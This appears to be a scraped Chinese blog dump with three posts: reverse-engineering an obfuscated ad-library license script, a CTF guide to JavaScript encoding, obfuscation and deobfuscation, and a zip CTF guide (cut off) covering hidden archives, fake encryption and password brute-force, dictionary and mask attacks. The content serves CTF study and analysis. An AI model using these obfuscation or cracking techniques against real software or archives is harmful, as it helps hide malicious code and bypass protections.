license.demo.js 可以看到开头有一段代码是这样的： 1234567891011var zBCa = function T(f) &#123; for (var U = 0, V = 0, W, X, Y = (X = decodeURI(\"+TR4W%17%7F@%17.....省略若干\"), W = '', 'D68Q4cYfvoqAveD2D8Kb0jTsQCf2uvgs'); U &lt; X.length; U++, V++) &#123; if (V === Y.length) &#123; V = 0; &#125; W += String[\"fromCharCode\"](X[\"charCodeAt\"](U) ^ Y[\"charCodeAt\"](V)); &#125; var S = W.split(\"&amp;&amp;\"); 通过跟踪执行，可以发现 S 变量的内容其实是本程序所有要用到的类名、函数名的集合，类似于 var S = [&#39;console&#39;, &#39;clear&#39;, &#39;console&#39;, &#39;log&#39;]。如果要调用 console.clear() 和 console.log() 函数的话，就这样 123var a = window;a[S[0]][S[1]]();a[S[2]][S[3]](); 混淆加密方法二：将函数定义加入到证书验证流程license.demo.js 中有多处这样的代码： 1a[&apos;RegExp&apos;](&apos;/R[\\S]&#123;4&#125;p.c\\wn[\\D]&#123;5&#125;t\\wr/&apos;,&apos;g&apos;)[&apos;test&apos;](T + &apos;&apos;) 这里的 a 代表 window，T 代表某个函数，T + &#39;&#39; 的作用是把 T 函数的定义转成字符串，所以这段代码的意思其实是，验证 T 函数的定义中是否包含某些字符。 每次成功的验证，都会返回一个特定的值，这些个特定的值就是解密核心证书的参数。 可能是因为我重新整理了代码格式，所以在重新运行的时候，这个证书一直运行不成功，所以后来就放弃了通过证书来突破的方案。 逆向思路：输出所有函数调用和参数通过断点调试，我们可以发现，想一步一步深入地搞清楚这整个程序的逻辑，是十分困难，因为它大部分函数之间都是相互调用的关系，只是参数的不同，结果就不同。 所以我后来想了个办法，就是只查看它的系统函数的调用，通过对调用顺序的研究，也可以大致知道它执行了哪些操作。 要想输出所有系统函数的调用，需要解决以下问题： 覆盖所有内置变量及类的函数，我们既要覆盖 window.console.clear() 这样的依附在实例上的函数，也要覆盖依附在类定义上的函数，如 window.HTMLAnchorElement.__proto__.click() 需要正确区分内置函数和自定义函数 经过搜索后，找到了区分内置函数的代码： 123456789101112131415161718192021222324252627282930313233// Used to resolve the internal `[[Class]]` of valuesvar toString = Object.prototype.toString;// Used to resolve the decompiled source of functionsvar fnToString = Function.prototype.toString;// Used to detect host constructors (Safari &gt; 4; really typed array specific)var reHostCtor = /^\\[object .+?Constructor\\]$/;// Compile a regexp using a common native method as a template.// We chose `Object#toString` because there&apos;s a good chance it is not being mucked with.var reNative = RegExp(&apos;^&apos; + // Coerce `Object#toString` to a string String(toString) // Escape any special regexp characters .replace(/[.*+?^$&#123;&#125;()|[\\]\\/\\\\]/g, &apos;\\\\$&amp;&apos;) // Replace mentions of `toString` with `.*?` to keep the template generic. // Replace thing like `for ...` to support environments like Rhino which add extra info // such as method arity. .replace(/toString|(function).*?(?=\\\\\\()| for .+?(?=\\\\\\])/g, &apos;$1.*?&apos;) + &apos;$&apos;);function isNative(value) &#123; var type = typeof value; return type == &apos;function&apos; // Use `Function#toString` to bypass the value&apos;s own `toString` method // and avoid being faked out. ? reNative.test(fnToString.call(value)) // Fallback to a host object check because some environments will represent // things like typed arrays as DOM methods which may not conform to the // normal native pattern. : (value &amp;&amp; type == &apos;object&apos; &amp;&amp; reHostCtor.test(toString.call(value))) || false;&#125; 然后结合网上的资料，写出了递归覆盖内置函数的代码： 123456789101112131415161718192021222324252627282930313233function wrapit(e) &#123; if (e.__proto__) &#123; wrapit(e.__proto__); &#125; for (var a in e) &#123; try &#123; e[a]; &#125; catch (e) &#123; // pass continue; &#125; var prop = e[a]; if (!prop || prop._w) continue; prop = e[a]; if (typeof prop == &apos;function&apos; &amp;&amp; isNative(prop)) &#123; e[a] = (function (name, func) &#123; return function () &#123; var args = [].splice.call(arguments,0); // convert arguments to array if (false &amp;&amp; name == &apos;getElementsByTagName&apos; &amp;&amp; args[0] == &apos;iframe&apos;) &#123; &#125; else &#123; console.error((new Date).toISOString(), [this], name, args); &#125; if (name == &apos;querySelectorAll&apos;) &#123; //alert(&apos;querySelectorAll&apos;); &#125; return func.apply(this, args); &#125;; &#125;)(a, prop); e[a]._w = true; &#125;; &#125;&#125; 使用的时候只需要： 12wrapit(window);wrapit(document); 然后模拟一下正常的操作，触发 PopUnder 就可以看到它的调用过程了。 参考资料： A Beginners’ Guide to ObfuscationDetect if function is native to browserDetect if a Function is Native Code with JavaScript","tags":[{"name":"javascript","slug":"javascript","permalink":"http://yoursite.com/tags/javascript/"}]},{"title":"CTF比赛中关于javascript的总结","date":"2017-11-12T12:06:05.000Z","path":"2017/11/12/CTF比赛中关于javascript的总结/","text":"前言在CTF比赛中MISC、CRYPTO、WEB中，经常会遇到有关js方面的题目，这些题目内容很杂，难度不一，所以成套的体系很难总结出来。所以本文只是笔者根据个人经历，总结的一套较为行之有效的工具书！ 技术介绍0x2.1 JavaScript简介JavaScript一种动态类型、弱类型、基于原型的客户端脚本语言，用来给HTML网页增加动态功能。 动态：在运行时确定数据类型。变量使用之前不需要类型声明，通常变量的类型是被赋值的那个值的类型。 弱类：计算时可以不同类型之间对使用者透明地隐式转换，即使类型不正确，也能通过隐式转换来得到正确的类型。 原型：新对象继承对象（作为模版），将自身的属性共享给新对象，模版对象称为原型。这样新对象实例化后不但可以享有自己创建时和运行时定义的属性，而且可以享有原型对象的属性。 PS：新对象指函数，模版对象是实例对象，实例对象是不能继承原型的，函数才可以的。 0x2.2 JavaScript组成部分0x2.2.1 ECMAScript（核心）作为核心，它规定了语言的组成部分：语法、类型、语句、关键字、保留字、操作符、对象。 具体参考es6 http://es6.ruanyifeng.com/ 如果想查看每种浏览器的兼容性情况，可以参考以下博客 es5兼容性： http://kangax.github.io/compat-table/es5/ es6兼容性： http://kangax.github.io/compat-table/es6/ 0x2.2.2 DOM（文档对象模型）DOM把整个页面映射为一个多层节点结果，开发人员可借助DOM提供的API，轻松地删除、添加、替换或修改任何节点。 0x2.2.3 BOM （浏览器对象模型）支持可以访问和操作浏览器窗口的浏览器对象模型，开发人员可以控制浏览器显示的页面以外的部分。 0x2.3 javascript中部分常见的书写方式说实在的，很多小伙伴表示javascript的表达方式太多了，而且其中有太多不为人知的利用策略。所以熊师傅给出一种套路，翻看工具书，上面已经给出了es6的参考博客！ 0x2.3.1 对象的变量或函数12345&gt; var s = \"class\";&gt; s.length // 等价于 s[\"length\"]5&gt; s.substr(2,2) // 等价于 s[\"substr\"](2,2)as 这里说明了javascript中对象访问属性有两种方法 obj.paramName，使用.访问 obj[parameName]，使用中括号属性名访问 0x2.3.2 类和函数的定义与使用 构造函数法定义类 12345678910function Cat() &#123; this.name = \"大毛\";&#125;// 类的属性和方法Cat.prototype.makeSound = function()&#123; alert(\"喵喵喵\");&#125;var cat1 = new Cat();alert(cat1.name); // 大毛 Object.create()法 12345678var Cat = &#123; name: \"大毛\", makeSound: function()&#123; alert(\"喵喵喵\"); &#125;&#125;;var cat1 = Object.create(Cat);alert(cat1.name); // 大毛cat1.makeSound(); // 喵喵喵 12345678// 兼容性考虑, 自己定义一个create函数if (!Object.create) &#123; Object.create = function (o) &#123; function F() &#123;&#125; F.prototype = o; return new F(); &#125;;&#125; 极简主义法（用得最多） 1234567891011var Cat = &#123; createNew: function()&#123; // createNew为构造函数，定义一个实例对象，把实例对象作为返回值 var cat = &#123;&#125;; cat.name = \"大毛\"; cat.makeSound = function()&#123; alert(\"喵喵喵\"); &#125;; return cat; &#125;&#125;;var cat1 = Cat.createNew();cat1.makeSound(); // 喵喵喵 1234567891011121314151617181920// 此处演示的是继承var Animal = &#123; createNew: function()&#123; var animal = &#123;&#125;; animal.sleep = function()&#123; alert(\"睡懒觉\"); &#125;; return animal; &#125;&#125;;var Cat = &#123; createNew: function()&#123; var cat = Animal.createNew(); cat.name = \"大毛\"; cat.makeSound = function()&#123; alert(\"喵喵喵\"); &#125;; return cat; &#125;&#125;;var cat1 = Cat.createNew();cat1.sleep(); // 睡懒觉 CTF实践0x3.1 js压缩与解压缩0x3.1.1 js压缩压缩js文件可以减少文件体积方便传输，还可以让别人看不懂。 简单的压缩一般是：删除注释和空白符，替换变量名。 更激进点的做法还包括：删除无用代码，内联函数，等价语句替换等。 开始压缩的时候必须要做到以下几点： 压缩前的代码格式要标准。因为去掉换行与空格时，所有语句就变成一行了，如果你的代码有瑕疵（比如某行少了个分号），那就会导致整个文件报错。当然，现在有的压缩工具已经比较智能了。 备份原文件 压缩很可能不会一次成功，一般要多试，多改 压缩js的工具，常见的有：YUI Compressor、UglifyJS、Google Closure Compiler) 、JSMin等。 0x3.1.2 js解压缩那么既然能压缩，那也应该能够解压缩，但是需要注意的是，如果按照上面给的标准，我们无法实现完全的解压缩，但是可以还原出一个多行且具有鲜明的层次化结构的js代码。 js解压缩的工具有：chrome开发者模式支持解压缩 ​ 菜鸟工具 https://c.runoob.com/front-end/51 ​ Chinaz http://tool.chinaz.com/js.aspx ​ tool.lu在线工具 http://tool.lu/js/ ​ CSS-JS https://tool.css-js.com/ 0x3.2 js加密与解密0x3.2.1 escape加密\\unescape解密1234567//加密&gt; escape('alert(\"黑客防线\"); ')\"alert%28%22%u9ED1%u5BA2%u9632%u7EBF%22%29%3B\"//解密&gt; unescape(\"alert%28%22%u9ED1%u5BA2%u9632%u7EBF%22%29%3B\")\"alert(\"黑客防线\"); \" 工具 http://www.haokuwang.com/unescape.htm 0x3.2.2 转义字符加解密转义字符&quot;&quot;，对于JavaScript提供了一些特殊字符如：n （换行）、 r （回车）、&#39; （单引号）等应该是有所了解 的吧？其实&quot;&quot;后面还可以跟八进制或十六进制的数字，如字符&quot;a&quot;则可以表示为：&quot;141&quot;或&quot;x61&quot;（注意是小写字符&quot;x&quot;），至于双字节字符如汉字&quot;黑&quot;则仅能用十六进制表示为&quot;u9ED1&quot;（注意是小写字符&quot;u&quot;），其中字符&quot;u&quot;表示是双字节字符，根据这个原理例子代码则可以表示为： 八进制转义字符串如下: 123// 使用console.log 或者 alert 或者confirm 或者 prompt调试 或者 document.write&gt; console.log(\"\\141\\154\\145\\162\\164\\50\\42\\u9ED1\\u5BA2\\u9632\\u7EBF\\42\\51\\73\")alert(\"黑客防线\"); 十六进制转义字符串如下: 12&gt; console.log(\"\\x61\\x6C\\x65\\x72\\x74\\x28\\x22\\u9ED1\\u5BA2\\u9632\\u7EBF\\x22\\x29\\x3B\")alert(\"黑客防线\"); 常见工具： 工具包-&gt;其他辅助工具-&gt;编码转换 ​ http://web2hack.org/xssee/ 0x3.2.3 Script Encoder来进行编码脚本编码器Script Encoder是Microsoft出品的脚本编码器。这里需要调用控件Scripting.Encoder完成的编码！由于很多电脑上没有安装这个控件，所以很多时候，你的主机运行不起来这个js代码。 123456&lt;SCRIPT LANGUAGE=\"JavaScript\"&gt; var Senc=new ActiveXObject(\"Scripting.Encoder\"); var code='12345'; var Encode=Senc.EncodeScriptFile(\".htm\",code,0,\"\"); alert(Encode); &lt;/SCRIPT&gt; 编码后的结果如下： 1&lt;SCRIPT LANGUAGE=\"JScript.Encode\"&gt;#@~^BQAAAA==qy&amp;*l/wAAAA==^#~@&lt;/SCRIPT&gt; 解密方法 1234&lt;SCRIPT LANGUAGE=&quot;JScript.Encode&quot;&gt; function decode() alert(decode.toString()); &lt;/SCRIPT&gt; 它是原理是：编码后的代码运行前IE会先对其进行解码，如果我们先把加密的代码放入一个自定义函数如上面的decode()中，然后对自定义函数decode调用toString()方法，得到的将是解码后的代码！ 如果你觉得这样编码得到的代码LANGUAGE属性是JScript.Encode，很容易让人识破，那么还有一个几乎不为人知的window对象的方法execScript() ，其原形为： window.execScript( sExpression, sLanguage) ps: 现在的es6中，已经不支持execScript了!!! 参数：sExpression: 必选项。字符串(String)。要被执行的代码。sLanguage : 必选项。字符串(String)。指定执行的代码的语言。默认值为 Microsoft JScript 工具选择： 加密工具： srcenc.exe 解密工具：srcdec18-VC8.exe 0x3.2.4 任意添加NUL空字符（十六进制00H）一次偶然的实验，使我发现在HTML网页中任意位置添加任意个数的&quot;空字符&quot;，IE照样会正常显示其中的内容，并正常执行其中的JavaScript 代码，而我们在用一般的编辑器查看时，添加的&quot;空字符&quot;会显示形如空格或黑块，使得原码很难看懂，如用记事本查看&quot;空字符&quot;则会变成&quot;空格&quot;， 利用这个原理加密结果如下：（其中显示的&quot;空格&quot;代表&quot;空字符&quot;） 123&lt;S C RI P T L ANG U A G E =\" J a v a S c r i p t \"&gt; a l er t (\" S w e e t\") ; &lt; / SC R I P T&gt; 如何？是不是显得乱七八糟的？如果不知道方法的人很难想到要去掉里面的&quot;空字符&quot;（00H）的！ 0x3.2.5 无用内容混乱以及换行空格TAB大法在JAVASCRIPT代码中我们可以加入大量的无用字符串或数字，以及无用代码和注释内容等等，使真正的有用代码埋没在其中，并把有用的 代码中能加入换行、空格、TAB的地方加入大量换行、空格、TAB，并可以把正常的字符串用&quot;&quot;来进行换行，这样就会使得代码难以看懂。 123456789101112131415&lt;SCRIPT LANGUAGE=\"JavaScript\"&gt; \"xajgxsadffgds\";1234567890 625623216;var $=0;alert//@$%%&amp;*()(&amp;(^%^ //cctv function// (//hhsaasajx xc /* asjgdsgu*/ \"Sweet\"//ashjgfgf /* @#%$^&amp;%$96667r45fggbhytjty */ //window ) ;\"#@$#%@#432hu\";212351436 &lt;/SCRIPT&gt; 0x3.2.6 JSPacker加解密这类最突出的特点就是eval(function(p,a,c,k,e,r)..... 所以当你遇到这类代码的时候，不妨试着使用一下JSPacker解密工具 1234//源代码eval(1);//加密后代码eval(function(p,a,c,k,e,r)&#123;e=String;if(!''.replace(/^/,String))&#123;while(c--)r[c]=k[c]||c;k=[function(e)&#123;return r[e]&#125;];e=function()&#123;return'\\\\w+'&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p&#125;('0(1);',2,2,'alert|'.split('|'),0,&#123;&#125;)) 加解密工具： tool.lu在线解密 http://tool.lu/js/ CSS-JS https://tool.css-js.com/ 手动解密： 其实将加密后的代码美化之后，会发现return p语句，在此之前，你只需要加上一句console.log(p)就能获得对应的解密后代码。 0x3.2.7 JSFuck加解密JSFuck 可以让你只用 6 个字符 [ ]( ) ! + 来编写 JavaScript 程序，所以很明显 jsfuck加密工具 http://www.jsfuck.com/ jsfuck解密工具 https://enkhee-osiris.github.io/Decoder-JSFuck/ ​ 手动： 其实jjencode的最后是一个函数，为此，我们只需要最后的()改成.toString()即可 0x3.2.8 jjencode/aaencodejjencode将JS代码转换成只有符号的字符串，类似于rrencode，但是符号大多数为\\$+~[]\\￥等 加密工具 http://utf-8.jp/public/jjencode.html 解密工具 https://github.com/jacobsoo/Decoder-JJEncode ​ 手动： 其实jjencode的最后是一个函数，为此，我们只需要最后的()改成.toString()即可 aaencode将JS代码转换成只有符号的字符串，aaencode可以将JS代码转换成常用的网络表情，也就是我们说的颜文字js加密。纯粹的表情 加密工具 http://utf-8.jp/public/aaencode.html 解密工具 https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html ​ 手动： 其实aaencode的最后是一个函数，为此，我们只需要最后的(&#39;_&#39;)改成.toString()即可 0x3.2.9 jother加解密jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括： ! + ( ) [ ] { } 。只用这些字符就能完成对任意字符串的编码。不同于jsfuck，它多了{}这两个大括号 这里可以参考文章jother编码之谜 加密工具 工具包-&gt;Misc-&gt;jother 解密工具 由于jother执行之后所得到的结果分为字符串和函数两种，所以解密的方法也不相同。 ​ 字符串：直接在Console界面中输入并回车即可 ​ 函数： 对于函数类型的jother加密结果，我们只需要将最后的()改成.toString()即可 0x3.2.10 自定义加密算法这无疑是这里面最难的一类。这样的一类算法，有可能是非对称的，经过加密之后仍能完成对应的功能！ 当然有些对称的，如果作者给出解密算法，可能就比较容易。关键是作者会不会这么做了 ps：基于大多数情况下，js代码加密之后，对应代码不一定能执行，所以通常js文件中会有对应的解密算法！ 0x3.3 js混淆混淆应该是工业界和ctf题中用得最多的方式之一了。Javascript 作为一种运行在客户端的脚本语言，其源代码对用户来说是完全可见的。但不是每一个 js 开发者都希望自己的代码能被直接阅读，比如恶意软件的制造者们。为了增加代码分析的难度，混淆（obfuscate）工具被应用到了许多恶意软件（如 0day 挂马、跨站攻击等）当中。分析人员为了掀开恶意软件的面纱，首先就得对脚本进行反混淆（deobfuscate）处理。 这一节的js混淆，强调的只是复杂化表达式 代码混淆不一定会调用 eval，也可以通过在代码中填充无效的指令来增加代码复杂度，极大地降低可读性。Javascript 中存在许多称得上丧心病狂的特性，这些特性组合起来，可以把原本简单的字面量（Literal）、成员访问（MemberExpression）、函数调 用（CallExpression）等代码片段变得难以阅读。 Js 中的字面量有字符串、数字、正则表达式 下面简单举一个例子。 访问一个对象的成员有两种方法——点运算符和下标运算符。调用 window 的 eval 方法，既可以写成 window.eval()，也可以 window[&#39;eval&#39;]； 为了让代码更变态一些，混淆器选用第二种写法，然后再在字符串字面量上做文章。先把字符串拆成几个部分：&#39;e&#39; + &#39;v&#39; + &#39;al&#39;； 这样看上去还是很明显，再利用一个数字进制转换的技巧：14..toString(15) + 31..toString(32) + 0xf1.toString(22)； 一不做二不休，把数字也展开：(0b1110).toString(4&lt;&lt;2) + (&#39; &#39;.charCodeAt() - 1).toString(Math.log(0x100000000) / Math.log(2)) + 0xf1.toString(11 &lt;&lt; 1)； 最后的效果：window[(2*7).toString(4&lt;&lt;2) + (&#39; &#39;.charCodeAt() - 1).toString(Math.log(0x100000000) / Math.log(2)) + 0xf1.toString(11 &lt;&lt; 1)](&#39;alert(1)&#39;) 在 js 中可以找到许多这样互逆的运算，通过使用随机生成的方式将其组合使用，可以把简单的表达式无限复杂化。 0x3.3.1 解析和变换代码本文对 Javascript 实现反混淆的思路是模拟执行代码中可预测结果的部分，编写一个简单的脚本执行引擎，只执行符合某些预定规则的代码块，最后将计算结果替换掉原本冗长的代码，实现表达式的简化。 如果对脚本引擎解释器的原理有初步了解的话，可以知道解释器在为了“读懂”代码，会对源代码进行词法分析、语法分析，将代码的字符串转换为抽象语法树（Abstract Syntax Tree, AST）的数据形式。 如这段代码： 1var a = 42; var b = 5; function addA(d) &#123; return a + d; &#125; var c = addA(2) + b; 对应的语法树如图： （由 JointJS的在线工具生成） 不考虑 JIT 技术，解释器可以从语法树的根节点开始，使用深度优先遍历整棵树的所有节点，根据节点上分析出来的指令逐个执行，直到脚本结束返回结果。 通过 js 代码生成抽象语法树的工具很多，如压缩器 UglifyJS 带的 parser，还有本文使用的 esprima。 esprima 提供的接口很简单： 1var ast = require('esprima').parse(code) 另外 Esprima 提供了一个在线工具，可以把任意（合法的）Javascript 代码解析成为 AST 并输出： http://esprima.org/demo/parse.html 再结合 estools 的几个辅助库即可对 js 进行静态代码分析： escope Javascript 作用域分析工具 esutil 辅助函数库，检查语法树节点是否满足某些条件 estraverse语法树遍历辅助库，接口有一点类似 SAX 方式解析 XML esrecurse 另一个语法树遍历工具，使用递归 esquery 使用 css 选择器的语法从语法树中提取符合条件的节点 escodegen与 esprima 功能互逆，将语法树还原为代码 项目中使用的遍历工具是 estraverse。其提供了两个静态方法，estraverse.traverse 和 estraverse.replace。前者单纯遍历 AST 的节点，通过返回值控制是否继续遍历到叶子节点；而 replace 方法则可以在遍历的过程中直接修改 AST，实现代码重构功能。具体的用法可以参考其官方文档，或者本文附带的示例代码。 0x3.3.2 规则设计从实际遇到的代码入手。最近在研究一些 XSS 蠕虫的时候遇到了类似如下代码混淆： 观察其代码风格，发现这个混淆器做了这几件事： 字符串字面量混淆：首先提取全部的字符串，在全局作用域创建一个字符串数组，同时转义字符增大阅读难度，然后将字符串出现的地方替换成为数组元素的引用 变量名混淆：不同于压缩器的缩短命名，此处使用了下划线加数字的格式，变量之间区分度很低，相比单个字母更难以阅读 成员运算符混淆：将点运算符替换为字符串下标形式，然后对字符串进行混淆 删除多余的空白字符：减小文件体积，这是所有压缩器都会做的事 经过搜索，这样的代码很有可能是通过 javascriptobfuscator.com的免费版生成的。其中免费版可以使用的三个选项（Encode Strings / Move Strings / Replace Names）也印证了前面观察到的现象。 这些变换中，变量名混淆是不可逆的。要是可以智能给变量命名的工具也不错，比如这个 jsnice 网站提供了一个在线工具，可以分析变量具体作用自动重命名。就算不能做到十全十美，实在不行就用人工的方式，使用 IDE（如 WebStorm）的代码重构功能，结合代码行为分析进行手工重命名还原。 再看字符串的处理。由于字符串将会被提取到一个全局的数组，在语法树中可以观察到这样的特征： 在全局作用域下，出现一个 VariableDeclarator，其 init 属性为 ArrayExpression，而且所有元素都是 Literal ——这说明这个数组所有元素都是常量。简单地将其求值，与变量名（标识符）关联起来。注意，此处为了简化处理，并没有考虑变量名作用域链的问题。在 js 中，作用域链上存在变量名的优先级，比如全局上的变量名是可以被局部变量重新定义的。如果混淆器再变态一点，在不同的作用域上使用相同的变量名，反混淆器 又没有处理作用域的情况，将会导致解出来的代码出错。 在测试程序中我设置了如下的替换规则： 全局变量声明的字符串数组，在代码中直接使用数字下标引用其值 结果确定的一连串二元运算，如 1 * 2 + 3 / 4 - 6 % 5 正则表达式字面量的 source，字符串字面量的 length 完全由字符串常量组成的数组，其join / reverse / slice 等方法的返回值 字符串常量的 substr / charAt 等方法的返回值 decodeURIComponent 等全局函数，其所有参数为常量的，替换为其返回值 结果为常数的数学函数调用，如 Math.sin(3.14) 至于缩进的还原，这是 escodegen 自带的功能。在调用 escodegen.generate方法生成代码的时候使用默认的配置（忽略第二个参数）即可。 0x3.3.3 DEMO 程序这个反混淆器的原型放在 GitHub 上：https://github.com/ChiChou/etacsufbo 运行环境和使用方法参考仓库的 README。 从 YOU MIGHT NOT NEED JQUERY上摘抄了一段代码，放入 javascriptobfuscator.com 测试混淆： 将混淆结果https://github.com/ChiChou/etacsufbo/blob/master/tests/cases/jsobfuscator.com.js进行解开，结果如下： 虽然变量名可读性依旧很差，但已经可以大体看出代码的行为了。 演示程序目前存在大量局限性，只能算一个半自动的辅助工具，还有许多没有实现的功能。 一些混淆器会对字符串字面量进行更复杂的保护，将字符串转换为 f(x) 的形式，其中 f 函数为一个解密函数，参数 x 为密文的字符串。也有原地生成一个匿名函数，返回值为字符串的。这种方式通常使用的函数表达式具有上下文无关的特性——其返回值只与函数的输入有关，与当 前代码所处的上下文（比如类的成员、DOM 中取到的值）无关。如以下代码片段中的 xor 函数： 1var xor = function(str, a, b) &#123; 1return String.fromCharCode.apply(null, str.split('').map(function(c, i) &#123; var ascii = c.charCodeAt(0); 如何判断某个函数是否具有这样的特性呢？首先一些库函数可以确定符合，如 btoa，escape，String.fromCharCode 等，只要输入值是常量，返回值就是固定的。建立一个这样的内置函数白名单，接着遍历函数表达式的 AST，若该函数参与计算的参数均没有来自外部上下文，且其所有 CallExpression 的 callee 在函数白名单内，那么通过递归的方式可以确认一个函数是否满足条件。 还有的混淆器会给变量创建大量的引用实例，也就是给同一个对象使用了多个别名，阅读起来非常具有干扰性。可以派出 escope 工具对变量标识符进行数据流分析，替换为所指向的正确值。还有利用数学的恒等式进行混淆的。如声明一个变量 a，若 a 为 Number，则表达式 a-a、a * 0 均恒为 0。但如果 a 满足 isNaN(a)，则表达式返回 NaN。要清理这类代码，同样需要借助数据流分析的方法。 目前还没有见到使用扁平化流程跳转实现的 js 混淆样本，笔者认为可能跟 js 语言本身的使用场景和特点有关。一般 js 的代都是偏业务型的，不会有太复杂的流程控制或者算法，混淆起来效果不一定理想。 0x3.3.4 工具总结混淆工具： https://javascriptobfuscator.com/Javascript-Obfuscator.aspx ( Encode Strings / Move Strings / Replace Names ) ​ http://tool.lu/js/ ( Replace Names ) ​ https://jscrambler.com 去混淆工具： https://github.com/ChiChou/etacsufbo ( 该工具去混淆能力太差 ) ​ http://jsnice.org/ ​ http://www.bm8.com.cn/jsConfusion/ ​ 反混淆终极工具： https://prepack.io/ ​ 最终推荐： 如果代码量不是特别大的化，手动去混淆吧，少年！ 这儿找到了一个手动去混淆的栗子，供大家观摩https://www.blackglory.me/l1l-document-all-features-detailed-js-confused-with-anti-aliasing-process/ ​ ​","tags":[{"name":"javascript","slug":"javascript","permalink":"http://yoursite.com/tags/javascript/"}]},{"title":"CTF比赛中关于zip的总结","date":"2017-11-12T02:22:32.000Z","path":"2017/11/12/CTF比赛中关于zip的总结/","text":"本文摘抄于http://www.360zhijia.com/360anquanke/217342.html 前言 在CTF比赛的MISC和CRYPTO中，经常要和zip压缩包打交道，这里做一个zip方面的总结。 本文中用到的所有文件和工具都可在这个网盘中找到http://pan.baidu.com/s/1bWQxyA 0x01. 通过进制转换隐藏信息： 这种方法比较简单，直接拿一道题讲解（题目来自ISCC 2017 Basic-04）。题目给了一个txt文档如下图 经过观察，所有数据都在16进制能表示的范围之内，因此先尝试使用十六进制编码解密，python脚本如下： 12345#coding:utf-8with open('Basic-04.txt') as f: cipher = f.read()#读取txt内容 plain = cipher.decode('hex')#16进制编码解密 print plain 运行结果如下，虽然存在大量乱码，但还是能看到flag.txt，因此猜测txt中的这段字符是zip包的16进制表示（同时开头的PK也暗示这是一个zip包，PK是zip格式发明者Phil Katz的名称缩写，zip的前两个字母就用了PK） 导入到16进制编辑器中，这里用010editor做演示 导入后选择 Save As（快捷键 ctrl + shift + s），给新文件命名时加上后缀.zip，保存后发现zip文件是正常的，因此证明思路正确，此题的后续过程请继续阅读这篇文章 另：除了16进制的编码转换，有时还会遇到2进制编码的转换，思路相同，不再复述 0x02. 在图片中隐藏压缩包（图种） 这种方法大概是zip中最常见的，多用于在一张图片中隐藏一个压缩包，这种方法的原理是：以jpg格式的图片为例，一个完整的 JPG 文件由 FF D8 开头，FF D9结尾，图片浏览器会忽略 FF D9 以后的内容，因此可以在 JPG 文件中加入其他文件。 也以一道题为例为例（ISCC 2017 Basic-07），对于这种隐写最简单的方法是使用Kali下的binwalk进行检测，binwalk 图片名 如下，检测出图片中存在压缩包 分离这个压缩包也有至少两种方法： 利用Linux下的foremost工具， foremost 图片名 如下，foremost默认的输出文件夹为output，在这个文件夹中可以找到分离出的zip（推荐使用这种方法，因为foremost还能分离出其他隐藏的文件） 更简单粗暴的方法是直接把图片的后缀改为.zip，然后解压即可（这种方法虽然简单快速，但如果隐写了多个文件时可能会失败） 另：本题后续步骤为构造字典，爆破握手包 0x03. 伪加密 Zip伪加密与zip的文件格式有关（zip的格式详解请翻到本文的最后0x07部分），zip中有一位是标记文件是否加密的，如果更改一个未加密zip包的加密标记位，那么在打开压缩包时就会提示该文件是加密的。 对于伪加密有以下几种方法： 在Mac OS及部分Linux（如Kali）系统中，可以直接打开伪加密的zip压缩包 使用检测伪加密的ZipCenOp.jar，解密后如果能成功打开zip包，则是伪加密，否则说明思路错误 使用16进制编辑器改回加密标记位 以HBCTF的一道题讲解这几种方法： 如上，尝试解压压缩包时提示有密码，根据题干：比爆破更好的方法推测为伪加密，用三种方法来解此题： 用除windows外的系统直接打开压缩包 在Mac OS和部分Linux系统（如Kali）中，右键解压可直接打开伪加密的zip压缩包，笔者暂未明确何种Linux能打开伪加密压缩包，如有传授，不胜感激！ 使用ZipCenOp.jar（需java环境） 使用方法 java -jar ZipCenOp.jar r xxx.zip 经ZipCenOp.jar解密后的压缩包可直接打开 推荐使用这种方法，最便捷 用16进制编辑器修改加密标记位 如上图，修改加密标记位为00，保存，即可打开压缩包（关于zip文件的结构，请翻到本文最末0x07部分） 0x04. 爆破/字典/掩码攻击 把这三种归位一类是因为这三种方法在本质上都是逐个尝试，只不过待选密码的集合不同 爆破：顾名思义，逐个尝试选定集合中可以组成的所有密码，知道遇到正确密码 字典：字典攻击的效率比爆破稍高，因为字典中存储了常用的密码，因此就避免了爆破时把时间浪费在脸滚键盘类的密码上 掩码攻击：如果已知密码的某几位，如已知6位密码的第3位是a，那么可以构造 ??a??? 进行掩码攻击，掩码攻击的原理相当于构造了第3位为a的字典，因此掩码攻击的效率也比爆破高出不少 对这一类的zip问题，推荐windows下的神器AZPR 举例如下： 对爆破，以ISCC 2017 Basic-08为例，选定暴力攻击、字符集和长度后进行爆破 点击开始，进行爆破，如下图，在4ms内就找到了密码为BIT 另：此题后续为简单的base64解密；爆破在密码长度小于6位时较快，因此如果在7位之内没有爆破出结果时，基本就可以考虑换个方法了；此题的正规解法是培根密码的转换 字典，还以之前的ISCC 2017 Basic-07举例，从图片中分离出一个加密的zip压缩包，爆破无果后考虑字典攻击（可从网上下载字典，但大多数题目需要自己构造字典，文末的网盘连接里提供了常见的字典） 字典攻击的结果如下图，在字典选择合适的情况下，用很短的时间就能找到密码 继续以此题为例，解压后的压缩包有一个txt文档和一个握手包，txt内容如下： 因此可知握手包的密码为ISCC****的形式（*代表大写字母或数字），自己写程序构造字典 12345678910111213#coding:utf-8import stringpw = 'ISCC's = string.digits + string.uppercase#s为后四位密码的可选字符集 f = open('dic.txt', 'w')for i in s: for j in s: for p in s: for q in s: f.write(pw + i + j + p + q + '\\n')#注意字典中的每一条记录都以\\n结尾 f.close() 运行此程序得到字典如下： 之后用aircrack-ng来选中字典跑除握手包的密码如下图，不再详述 掩码攻击，以ISCC 2017 Misc-06为例，题目给了一个jpg图片，用0x02中的方法分离出加密的压缩包，根据题目提示：注意署名， 构造????LiHua的掩码（?可在自己定义的字符集中任意选择）进行掩码攻击，如下图： 攻击结果如下，只耗费了很少的时间就找到了密码 0x05. 明文攻击 明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件，更详细的原理请读者自行谷歌举个例子，已知 明文攻击.zip 中存在的文件 明文.txt，因此将 明文.txt 